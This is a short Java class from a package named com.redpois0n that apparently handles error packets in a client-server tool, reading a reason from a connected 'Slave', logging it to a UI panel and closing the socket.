package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;
import com.redpois0n.ui.panels.PanelMainLog;

public class PacketERROR extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String reason = slave.readLine();
		
		PanelMainLog.instance.addEntry("Error", slave, reason);
		
		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
